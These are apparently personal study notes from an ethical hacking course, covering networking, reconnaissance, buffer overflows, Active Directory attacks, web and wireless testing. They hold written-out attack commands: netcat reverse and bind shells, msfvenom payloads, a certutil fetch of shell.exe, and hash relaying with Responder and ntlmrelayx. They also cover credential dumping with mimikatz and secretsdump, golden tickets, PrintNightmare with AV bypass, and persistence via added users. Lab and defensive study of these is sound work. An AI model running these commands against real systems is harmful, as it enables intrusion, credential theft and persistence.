PEH - TCM

https://tcm-sec.com/
https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course

recs - https://github.com/Gr1mmie/Practical-Ethical-Hacking-Resources





## Subnetting

128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1    128 64 32 16 8 4 2 1
  1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      1  1  1  1 1 1 1 1      0  0  0  0 0 0 0 0    /24
                 255                     255                     255                       0
                                                                                                hosts 2^8(no of zeros)
                                                                                                      256


              1   2   3   4   5   6   7   8     255.0.0.0
              9  10  11  12  13  14  15  16     255.255.0.0
             17  18  19  20  21  22  23  24     255.255.255.0
             25  26  27  28  29  30  31  32     
             
hosts       128  64  32  16   8   4   2   1
subnet      128 192 224 240 248 252 254 255


class A     10.0.0.0                    total hosts 16,777,216
class B     172.16.0.0 - 172.31.0.0                 65,536
class C     192.168.0.0 - 192.168                   256
loopback    127.0.0.0 - 127.0.0.7                                                                      


subnet   x.0.0.0
CIDR                   /1             /2           /3           /4           /5          /6         /7          /8
hosts       2,147,483,648  1,073,741,824  536,870,912  268,435,456  134,217,728  67,108,864  33,554,43  16,777,216

subnet   255.x.0.0
CIDR               /9       /10       /11       /12     /13     /14     /15     /16
hosts       8,388,608 4,194,304 2,097,152 1,048,576 524,288 262,144 131,072  65,536

subnet   255.255.x.0
CIDR            /17     /18     /19     /20    /21    /22     /23     /24
hosts       32,768   16,384   8,192   4,096  2,048  1,024     512     256

subnet   255.255.255.x
CIDR        /25  /26  /27  /28  /29  /30  /31  /32
hosts       128   64   32   16    8    4    2    1

subnet mask(replace x) 128  192  224  240  248  252  254  255


eg
                    subnet              hosts   Network         Broadcast
192.168.1.0/24      255.255.255.0       254     192.168.1.0     192.168.1.255
192.168.1.0/28      255.255.255.240     14      192.168.1.0     192.168.1.15
192.168.1.16/28     255.255.255.240     14      192.168.1.16    192.168.1.31
192.168.1.0/23      255.255.254.0       510     192.168.0.0     192.168.1.255
192.168.2.0/23      255.255.254.0       510     192.168.2.0     192.168.3.255

192.168.0.0/22      255.255.252.0     1,022     192.168.0.0     192.168.3.255
192.168.1.0/26      255.255.255.192      62     192.168.1.0     192.168.1.63
192.168.1.0/27      255.255.255.224      30     192.168.1.0     192.168.1.31



git clone pimpmykali


Bash
- ipsweep
- for ip in $(cat ip.txt); do nmap $ip; done




Stages
- Recon(active and passive)
- Scanning and enum(nmap,nessus,nikto)
- Gain access(exploitation)
- Maintain access
- Covering tracks(clean up logs,malwares,redo settings,accounts)




#Info Gathering(Passive)
location
employees
web/host - target validation(lookup,dnsrecon)
         - subdomains(bluto,google fu,dig,nmap,sublist3r,crt.sh)
         - fingerprinting(nmap,wapalizer,builtwith,whatweb,netcat)
         - data beaches(haveibeenpawned,breachparse,weleakinfo)
emails - hunter.io
       - phonebook.cz
       - tools.verifyemailaddress.io
       - email-checker.net
Creds  - breachparse.sh @domain.com domain.txt
       - dehashed(subscribe,login) (mk@domain.com mk1234, @domain.com)
       - hashes.com
subdomains - apt install sublist3r/owasp amass
           - crt.sh - certificate fingerprinting(%.domain.com)
           - tomnomnomm httpprobe(liveness of sub)
websites - builtwith.com
         - wappalizer
         - whatweb
         - burp
         - google fu(dorks)
social media
OSINT




#Scanning and enum
kioptrix(vulnhub) john TwoCows2
       - arpscan -l
       - netdiscover
       3 way handshake   - SYN SYNACK ACK
                         - SYN SYNACK RST (nmap -sS)
       - nikto
       - dirb, dirbuster, gobuster, feroxbuster
SMB - 139,445(port TCP/UDP 137 for name services, and port UDP 138 for datagram services)
       - msf
       - smbclient -L \\\\ip\\
SSH    - ssh ip -oKexAlgorithms=+</algo> -c aes128-cbc
Nessus




#Exploitation basics
Reverse shell - victim --> attacker
              nc <victimip> 4444 -e /bin/sh   -->  nc -lnvp 4444
Bind shell - attacker --> victim
              nc <attackerip> 4444  -->  nc -lnvp 4444 -e /bin/sh
Payloads - Staged - sends payload in stages
                  - less stable
                  - windows/meterpreter/reverse_tcp
         - Non-staged - sends shellcode payload at once
                      - large and might fail
                      - windows/meterpreter_reverse_tcp
credential stuffing - inject breached acc creds for acc takeover
password spraying - using known usernames against unknown passwd
       if on AD careful on acc lock out.




#New Capstone
- Download machines for vm
       -Blue, Academy, Dev, Butler, Blackpearl
- Pentesting for noobs HTB series
       - https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB
ffuf -w wordlistpath:FUZZ -u http://10.10.4.4/FUZZ
certutil.exe -urlcache -f http://serverip/shell.exe shell.exe
dnsrecon -r 127.0.0.0/24 -n myip -d domain




#Exploit Development (Buffer Overflows)
Resources
    - win evaluation 10 enterprise
    - https://www.immunityinc.com/products/debugger/
    - vulnserver on victim machine - http://thegreycorner.com/vulnserver.html
kernel(top) -> stack -> heap -> Data -> Text(bottom)
Stack
    - Extended Stack Pointer(ESP)(top)
    - Buffer Space
    - Extended Base Pointer(EBP)(bottom)
    - Extended Instruction Pointer(EIP)/Return Address
Overload buffer space to EIP.
Steps
    - Spiking - find vuln part
    - Fuzzing - send xxcters to break
    - Find offset - where program breaks
    - Overwrite EIP - overwrite pointer address
    - Find bad xxcters
    - Find the right module
    - Generate shellcode(point EIP to shellcode)
    - Be root
    
vulnserver and immunity as admin.
attach process, play
kali    - nc -nv 192.168.1.100 9999

       #spiking
        - pluma stats.spk
                s_readline();
                s_string("STATS ");
                s_string_variable("0");
        - generic_send_tcp 192.168.1.100 9999 stats.spk 0 0

        #fuzzing 
        - pluma trun.spk
              s_readline();
              s_string("TRUN ");
              s_string_variable("0");
        - generic_send_tcp 192.168.1.100 9999 trun.spk 0 0

        #find offset
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 386F4337(EIP addr)

        #find bad chars
        https://github.com/cytopia/badchars
        follow in dump and check missing seq nums
        in successive seq assume first char as bad

        #find right module - some dll without memory protection(no death, aslr, safeseh)
        https://github.com/corelan/mona
        mona.py in pycommands folder(immunity debugger)
        opcode equiv (nasm_shell)
        /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
            JMP ESP
        !mona find -s "\xff\xe4" -m essfunc.dll
        
        #gen shellcode and get root
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"




#Active Directory Overview
https://learn.microsoft.com/en-us/training/modules/introduction-to-ad-ds/3-define-users-groups-computers
manage windows domain networks
stores info of objs - commp, users, printers...
Kerberos authentication
non windwos devices(authentication) - RADIUS, LDAP
Abuse features, trusts, components, policies...

Physical AD components
DC - server with AD DS role promoted to DC
   - host AD DS directory store
   - authentication and authorization
   - Replicate updates to other DCs in the domain and forest
   - manage user accouts and network resources
AD DS Data store - database files and processes that store and manage directory info for users, services, and apps.
                 - has Ntds.dit file
                 - default folder %SystemRoot%\NTDS on all DCs
                 - accessible only thru DC processes and protocols

Logical AD components
AD DS Schema - defines objects
             - enfoce rules on obj creation and config
Domains - group and manage objs
        - administrative boundary for replicating applying policies to groups of objs
        - replication boundary for replicating data btn DCs
        - authentication and authorization boundary that provides a way to limit scope of access to resources
Trees - Hierarchy of domains in AD DS
      - share contiguous namespace with parent domain
      - Can have additional domains
      - By default creates a two-way transitive trust with other domains
Forests - collection of domain trees
        - common schema
        - common config partition
        - common global catalog to enable searching
        - enable trusts btn domains in the forest
        - share enterprise admins and schema admins groups
Organizational Units(OUs) - AD containers with users, groups, comps and other OUs
                          - Rep org hierarchically and logically
                          - manage collection of objs consistently
                          - delegate permission to administer groups of objs
                          - apply policies
Trusts - mechanisms for users to gain access to recs in another domain
       - Directional - trust direction from trusting domain to trusted domain
       - Transitive - trust beyond two-domain trust to other trusted domains
       - all domains in a forest trust other doamins in the forest
       - trusts can extend outside the forest
Objects - User - enables net recs access for user
        - InetOrgPerson - similar to user acc
                        - for compatibility with other directory services
        - Contacts - assign emails to external users
                   - does not enable network access
        - Groups - simplify administration of access control
        - Comps- enable authentication and auditing of comp access to recs
        - Printers - simplify location and connection to printers
        - Shared folders - enables users search for shared folders based on properties

#AD lab build
https://learn.microsoft.com/en-us/training/modules/introduction-to-ad-ds/3-define-users-groups-computers

DC setup
server(DC) - std desktop exp, 2gb, NAT
use admin acc
rename pc(anything-dc)
manage - add roles - server roles - AD services - install
promote to DC - add new forest(anything.local)
directory services restore mode password
install

machine setup
NAT, 2gb
rename pc(anything)

Setting Up Users, Groups, and Policies
tools - ad users/comps - create users

shares(smb 139,445)
file storage services - share - smb quick - name

service pn
cmd(admin) - setspn -a anything-dc/sqlservice.marvel.local:60111 marvel/sqlservice
           - setspn -T marvel.local -Q */*

group policy man(admin)
domain - create gpo(disable defender) - edit - comp config - policies - adm templ - win compo - defender - turn off(enable, apply)
scope - (enforced = yes)

join machines to domain
fake empty share on C://
set dns server ip to DC
joint local ad
login marvel\administrator
add admin users - comp mangmnt
confirm from dc
turn on discovery and file sharing


Initial attack vectors
https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

LLMNR Poisoning
link-local multicast name resolution(formerly NBT-NS)
identify hosts when dns fails
responds with user's username and NTLMv2 hash
python3 /usr/share/responder/Responder.py -I wlo1 -rdwv(run in morning/afterlunch, when ppl are starting traffic/services)/ responder -I wlo1 -rdwv
access share(\\ip)

cracking NTLMv2 hash with hashcat
hashcat --help | grep -i ntlm
hashcat -m 5600 hash.txt rockyou.txt --force -O

LLMNR poisoning defense
disable LLMNR(local comp policy-comp config-admin teml-net-dns client in group policy editor-multicast name resolution)
disable NBT-NS(net adapter settings-tcp/ipv4 properties-advanced-wins-diasble NetBios over tcp/ip)
if must use:
       -require net access control
       -strong user pass(>14chars,no commons words)

SMB Relay attacks
relay hashes gathered with responder to specific machines
       SMB signing must be disabled on target
       relayed user creds must be admin on machine relayed to
change responder config to listen but don't respond
       http and smb servers - off
       edit /etc/responder/Responder.cong
       turn off SMB and HTTP
       python3 /usr/share/responder/Responder.py -I wlo1 -rdwv
setup relay
       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support
access share

Discover hosts with smb signing disabled(or not required)
nessus scan
github SMB signing chack scripts
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24

attack
If SMB is failing to relay, attempt to navigate to the attacker’s IP address from a web browser (such as \192.168.10.1)
instead of the SMB event. You should trigger a relay.
edit /etc/responder/Responder.cong
       turn off SMB and HTTP
python3 /usr/share/responder/Responder.py -I wlo1 -rdwv
setup relay
       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support
access share(\\ip)
dumped haches(crack or pass them)
hashcat -m 5600 hash.txt rockyou.txt --force -O
SMB shell(tcp)
       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support -i
       help
       shares
       use sharename
       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support -c "command"

SMB relay defense
enable SMB signing on all devices(causes issues with file copies)
disable NTLM authentication on network(if kerberos stops working, wins defaults to back NTLM)
account tiering(limits domain admins to specific tasks)
local admin restriction(increased service desk tickets)

Gain shell access
msf-exploit/windows/smb/psexec-set smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets
impacket-psexec marvel.local/fcastle:password123@192.168.57.2
impacket-smbexec
impacket-wmiexec

IPv6 attacks
DNS
mitm6 - https://github.com/dirkjanm/mitm6

set up LDAPS(secure)
manage-add roles-ad certificate services,NET features-install
open exclamtn-configure-cert authority-enterprise CA-root-new priv key-sha256-99 years-configure(reboot)
mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
ntlmrelayx is giving an error
Impacket versions > 0.9.19 are unstable and causing issues. 
Try purging impacket completely and downloading 0.9.19 from here: https://github.com/SecureAuthCorp/impacket/releases
mitm6 -d marvel.local
set relay
       python3 ntlmrelayx.py(or impacket) -6 -t ldaps://dcIP -wh fakewpad.marvel.local -l lootme
restart comp to speed up
cd lootme
ls
firefox domain_users_by_group.html

IPv6 Attack Defenses
wins queries ipv6 address in ipv4 only environs
-block DHCPv6 traffic and incoming router advertisements in firewalll via group policy
-if WPAD is not in use internally, disable it via group policy and disable WinHttpAutoProxySvc service
-enable both LDAP signing and LDAP channel binding to mitigate relaying to LDAP(s)
-prevent user impersonation via delegation:
       -considering admin users to protected users group
       -mark them as Account is sensitive and cannot be delegated

Passback attacks
printers/iot
https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/

Other attack vectors and strategies
mitm6 and responder
run scans(nessus,sweeps,msf(http_version)..) to generate traffic
look for websites in scope if scans take too long
default creds in printers, jenkins, etc




Post Compromise enumeration

AzureHound
powerview(powershellmafia clone) - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
powershell -ep bypass
       . .\PowerView.ps1
              Get-NetDomain
              Get-NetDomainController
              Get-DomainPolicy
              (Get-DomainPolicy)."system access"
              Get-NetUser
              Get-NetUser | select cn(more >> samaccountname, description)
              if useraccountcontrol == 500 is admin
              Get-UserProperty
              Get-UserProperty -Properties pwdlastset(more >> logoncount, badpwdcount)
              Get-NetComputer
              Get-NetComputer -FullData
              Get-NetComputer -FullData | select OperatingSystem
              Get-NetGroup
              Get-NetGroup -GroupName "Domain Admins"
              Get-NetGroup -GroupName *admin*
              Get-NetGroupMember -GroupName "Domain Admins"                         #admins
              Invoke-ShareFinder                                                    #shares
              Get-NetGPO
              Get-NetGPO | select displayname, whenchanged

Bloodhound
apt install bloodhound
neo4j console(noe4j:neo4j) - change pass
bloodhound

grab data with Invoke-Bloodhound, sharphound(clone BloodHoundAD)
SharpHound.ps1(upload to windows machine)
powershell -ep bypass
       . .\SharpHound.ps1
              Invoke-BloodHound -CollectionMethod All -Domain marvel.local -ZipFileName file.zip
              move file to attacker machine
from browser
upload data(file)
queries




Post Compromise attacks

pass the hash/password
crackmapexec smb 10.0.3.0/24 -u fcastle -d marvel -p Password1
from msf> smb/psexec > hashdump > user 500(admin) hash(second half)
       crackmapexec smb 10.0.3.0/24 -u fcastle -H hash --local-auth
crackmapexec smb 10.0.3.0/24 -u fcastle -d marvel -p Password1 --sam
psexec.py marvel/fcastle:Password1@192.168.57.142(pwned) - shell

dump hashes with secretsdump.py
secretsdump.py marvel/fcastle:Password1@192.168.57.141(pwned)
pass/crack dem hashes(NTLM-second half)
NTLM hashes can be passed NTLMv2 cannot
hashcat -m 1000 hash.txt rockyou.txt --force -O

pass the hash attacks
crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H hash --local-auth
get shell
psexec "frank castle":@192.168.57.141(pawned) -hashes hash:hash

pass attack mitigation
limit acc reuse
       avoid local admin passwd reuse
       disable guest/admin accs
       limit who is admin
strong passwords
       long sentence > 14 chars
       uniques words
privilege access mangnt(PAM)
       check in/out sensitive accs when needed
       auto rotate passwds in check in/out

Token impersonation attacks
token - temporary keys that allow system access without providing creds eavh time you access a file.
types - Delegate
              for logging into a machine or RDP
      - Impersonate
              non-interactive such as attaching a network drive or a domain logon script

token impersonation with incognito
msf-exploit/windows/smb/psexec-set rhosts,smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets(native upload)
       hashdump,getuid,sysinfo
       load incognito
       help
       list_tokens -u
       impersonate_token marvel\\administrator
       shell
       whoami
       ctrl+c(exit)
rev2self(if hashdump access denied)
impersonate other users

token impersonation mitigation
limit user/group token creation perms
account tiering
local admin restriction

Kerberoasting
goal - get TGS and decrypt server's accnt hash
user <> DC(Key distribution center-KDC) <> app service server(SQL,AV..)
       provide NTLM request TGT
       receive TGT(encrypted with krbtgt acc hash)
       provide TGT request TGS for server(service principle name-SPN)
       receive TGS
              provide TGS for service(encrypted with server acc) in server account
              use TGS for mutual authentication
              app server send PAC validation request(optional)
              app server receives PAC validation request(optional)
impacket-GetUserSPNS marvel.local/fcastle:Password1 -dc-ip 192.168.52.140 -request
copy hash
hashcat --help | grep -i kerberos - 13100
hashcat -m 13100 hash.txt rockyou.txt --force -O

Kerberoasting mitigation
strong passwds
least privilege

Group policy preferences(GPP)/cPassword attacks - CVE MS14-025
-gpp allow admins to create policies using embedded creds
-the creds are encrypted and stored in cPassword(xml doc)
-the key was accidentally released
-patched in MS14-025 but doesn't prevent previous ones
https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
powershell scripts
msf - auxillsmb_enum_gpp
Even without Metasploit, one can extract the cpassword value from the files on SYSVOL 
and pass them to the gpp-decrypt tool in Kali Linux which will decrypt it:

abusing GPP
HTB - Active box
nmap -T5 ip
53,88,389,636 - probably a DC
smbclient -L \\\\ip\\
prompt off
recurse on
mget *
gpp-decrypt encryptedpassword

part 2
psexec active.htb/svc_tgs:decryptedpassword@IP
Impacket-GetUserSPNs active.htb/svc_tgs:decryptedpassword -dc-ip IP -request
copy TGS
hashcat -m 13100 hash.txt rockyou.txt -O
get shell
psexec active.htb/Administrator:TGScrackedpassword@IP

URL File attacks
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

html - save file to share("@anything.url")
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\attackerIP\%USERNAME%.icon
IconIndex=1

responder -I eth0 -v
navigate to file from win machine
relay/crack

printnightmare - wins print spooler(LPE/RCE) CVE-2021-1675/CVE-2021-34527 
https://github.com/cube0x0/CVE-2021-1675,     https://github.com/calebstewart/CVE-2021-1675
Scanning
       rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
              Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
              Protocol: [MS-RPRN]: Print System Remote Protocol
msfvenom -p windows/x64/meterprete/reverse_tcp lhost=ip lport=port -f dll > shell.dll
obfuscate dll and AV bypass
msfconsole
       use multi/handler
       set lhost,lport
       run
set up file share
       Impacket-smbserver share `pwd` -smb2support
python CVE-2021-1675.py marvel.local/fcastle:Password@IP '\\IP\share\shell.dll'
getuid
hashdump

mimikatz - https://github.com/gentilkiwi/mimikatz  - wiki site
view steal creds, generate kerberos tickets and leverage a tacks
dump creds from memory, pass the hash, over pass the hash, pass the ticket, build golden ticket, silver ticket

credential dumping with mimikatz
mimikatz.exe on dc
       privilege::debug
       sekurlsa::logonpasswords
       lsadump::sam  (local security authority)
       lsadump::sam /patch
       lsadump::lsa /patch

golden ticket attacks(persistence)
mimikatz.exe on dc
       privilege::debug
       lsadump::lsa /inject /name:krbtgt
       copy sid of domain, NTLM of krbtgt account
       kerberos::golden /User:Administrator /domain:marvel.local /sid:sidvalue /krbtgt:krbtgtNTLM /id:500 /ptt
       misc::cmd
       dir \\thepunisher\sharename
       upload psexec on dc(get shell)
       psexec.exe \\thepunisher cmd.exe

abusing zerologon - CVE-2020-1472
a vulnerability in the cryptography of Microsoft’s Netlogon process that allows an attack against Microsoft AD dc.
Zerologon makes it possible for a hacker to impersonate any computer, including the root domain controller.
What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472




conclusion
Resources for this video:
Active Directory Security Blog: https://adsecurity.org/
Harmj0y Blog: http://blog.harmj0y.net/
Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
eLS PTX: https://elearnsecurity.com/product/ecptx-certification/



#Post Exploitation
File transfers
       certutil.exe --urlcache if http://IP/file.txt file.txt
       python -m http.server 9090
       python -m SimpleHTTPServer 9090
       Direct browser navigation
       FTP - python -m pyftpdlib 21 <attackerIP>
           - ftp <attackerIP>
       wget
       metasploit
Maintaining access
       persistence scripts
              run persistence -h
              exploit/windows/local/persistence
              exploit/windows/local/registry_persistence
       scheduled tasks
              run scheduleme
              run schtaskabuse
       add user
              net user hacker password123 /add
              sudo useradd hacker(sudo useradd -m username -  - with home dir
                                  sudo useradd -m -d /opt/username username - with specific home dir)
              sudo passwd hacker
Pivoting(ssh, proxychains, msf)
       exploit/windows/smb/psexec
       route
       ipconfig
       arp -a
       run autoroute -s 10.10.10.0/24
       run autoroute -p
       bg
       use auxiliary/scanner/portscan/tcp
Cleanup - remove executables, scripts, added files
        - rm malware, rootkits, added users
        - revoke settings to original
        - clear logs




#Web application enumeration
Finding subdomains
       Assetfinder
              go get -u github.com/tomnomnom/assetfinder
              go install github.com/tomnomnom/assetfinder@latest
              apt install assetfinder
              assetfinder --subs-only tes.com
       Amass
              https://github.com/OWASP/Amass
              export GO111MODULE=on
              go install -v github.com/OWASP/Amass/v3/...@master
              sudo snap install amass
              export PATH=$PATH:/snap/bin
              Periodically, execute the following command to update all your snap packages:
              sudo snap refresh
              apt-get update
              apt-get install amass
              amass enum -d tes.com
       alive domains with Httprobe
              ▶ go install github.com/tomnomnom/httprobe@latest
              cat tesla.com/recon/final.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443'
screenshoting with Gowitness
       go get -u gorm.io/gorm
       If you have your Golang binary path in your $PATH, use go get -u github.com/sensepost/gowitness.
       Use go install github.com/sensepost/gowitness@latest if you have Golang 1.17+
       gowitness single https://tesla.com
Automating enum
       https://github.com/Gr1mmie/sumrecon
       https://pastebin.com/MhE6zXVt
Hunting
       https://www.youtube.com/watch?v=uKWu6yhnhbQ
       https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA




#OWASP top 10
https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf
https://github.com/tanprathan/OWASP-Testing-Checklist
https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf
https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe
https://github.com/juice-shop/juice-shop
https://pwning.owasp-juice.shop/
docker pull bkimminich/juice-shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

https://github.com/WebGoat/WebGoat
docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/webgoat
If you want to reuse the container, give it a name:
docker run --name webgoat -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/webgoat
As long as you don't remove the container you can use:
docker start webgoat

1. SQL injection
       ' " string delimiters
       -- /* # comment delimiters
       * % wildcards
       : terminator
       = + > < () programmatic logic
2. Broken auth
       auto attacks(brute, cred stuffing)
       default,weak creds
       weak creds recovery, forgot password
       plaintext,unencrypted weak hashes
       missing multifactor auth
       exposing sess ids in url
       No rotation of sess ids after login(session fixation)
       does not properly invalidate sess ids, auth tokens
3. Sensitive data exposure
       passwords,cc numbers,health records,business secrets,PII,PCI
       http,smtp,ftp transmission
       weak crypto algos
       default,weak,reused crypto keys,improper key management, no rotation
       browser headers missing(https strict transport security,csp,referer....)
              securityheaders.com
       verify server certificate
              nmap --script=ssl-enum-ciphers -p 443 tesla.com
4. XML externa entities(XXE)
       attack sys that parse xml input
       abuse sys entity and get malicious
       attacks include
              dos,local file disclosure, rce....
5. Broken access control - user access where they shouldn't
       modify url,internal app state,custom api
       primary key changed to another users's record(IDOR)
       elevation of privileges(acts as user/admin)
       metadata manipulation(jw tokens,cookies, invalidation)
       CORS misconfiguration
       force browsing to authenticated pages
6. security misconfiguration
       missing security hardening
       misconfigured permissions
       unnecessary features(ports,services,pages,account,privileges)
       default accs and passwords
       overinformative error handling
       insecure security feature configuration
       insecure values in headers from server
       vulnerable outdated software
7. XSS - Unsanitized input (https://xss-game.appspot.com/)
       reflected - app includes unvalidated input as html output
       stored - stored in server(critical)
       DOM - Doc object model- js frameworks,singlepage apps and APIs dynamically include attacker controllled data to page.
       prevention
              encoding(special chars)
              filtering(strip out chars)
              validating(whitelisting input)
              sanitization(combination of encoding,validation and filters)
8. Insecure deserialization(ysoserial)
       serialization - convert obj to send thru network(in xml js,binary)
       serialization is used for
              remote and interprocess comm(RPC/IPC)
              wire protocols,web services,msg brokers
              caching/persistence
              databases,cache servers,file systems
              http cookies,html form params,api auth tokens
       serialize an exploit and the app deserializes and executes it
       attacker modifies app logic or achieves rce if there are classes that can change behaviour during/after deserialization
9. Components with know vulns
       vulnerable softwares,libraries - wappalizer, scanners
       easy to find exploits
10. Insufficient logging and monitoring
       Auditable events, such as logins, failed logins, and high-value transactions are not logged.
       Warnings and errors generate no, inadequate, or unclear log messages.
       Logs of applications and APIs are not monitored for suspicious activity.
       Logs are only stored locally.
       Appropriate alerting thresholds and response escalation processes are not in place or effective.
       Penetration testing and scans by DAST tools (such as OWASP ZAP) do not trigger alerts.
       The application is unable to detect, escalate, or alert for active attacks in real time or near real time.
       You are vulnerable to information leakage if you make logging and alerting events visible to a user or an attacker




#Wireless penetration testing
Wired Equivalent Privacy (WEP)
Wi-Fi Protected Access ii (WPA2 PSK(pre shared key))
Wi-Fi Protected Access ii (WPA2 ENTERPRISE(RADIUS, TACACS+)
Activities:
       Evaluate strength of PSK(handshake capture)
       Review nearby networks(war-driving, war-walking)
       Assess guest networks(network separation)
       Check network access(least privileges, rogue devices)
compatible wireless dongles
process:
       monitor mode
              airmon-ng check kill
              airmon-ng start wlan0
       discover channel,BSSID
              airodump-ng wlan0mon
       select net and capture data
              airodump-ng -c 6 --bssid <bssid> -w capture wlan0mon
       deauth attack
              aireplay-ng -0 1 -a <bssid> -c <station> wlan0mon
       crack wpa handshake
              aircrack-ng -w wordlist -b <bssid> capture.cap




#Legal documents and report writing
sales
       Mutual non-disclosure agreement(NDA)
       Master service agreement(MSA)
       Statement of work(SOW)
       others: sample report, recommendation
Before testing
       Rules of engangement(ROE)
After testing
       Findings report

pentest report writing      
https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report



Career advice
don't be complacent, stay motivated, learning
apply even for the unqualified
apply to those that meet your criteria(what you want)
write Questions you have no answers from interview
be the dumbest in the room(if you aren't it's time to leave)
network(who you know)